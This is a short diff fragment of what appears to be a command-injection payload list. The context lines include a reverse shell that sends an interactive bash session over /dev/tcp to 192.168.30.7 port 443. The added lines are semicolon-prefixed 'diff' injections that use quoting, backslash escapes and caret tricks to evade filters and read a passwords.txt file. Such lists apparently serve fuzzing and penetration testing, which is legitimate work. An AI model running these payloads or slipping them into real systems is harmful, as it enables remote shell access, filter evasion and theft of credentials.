@@ -666,3 +666,10 @@ echo FYVZVP > /tmp/FYVZVP.txt
 cat /tmp/FYVZVP.txt
 perl doc.txt
 setsid /bin/bash -i >/dev/tcp/192.168.30.7/443 0<&1 2>&1
+
+# diff
+;diff /dev/null passwords.txt
+;'diff' /dev/null passwords.txt
+;"diff" /dev/null passwords.txt
+;\d\i\f\f /dev/null passwords.txt
+;diff^ a.txt b.txt
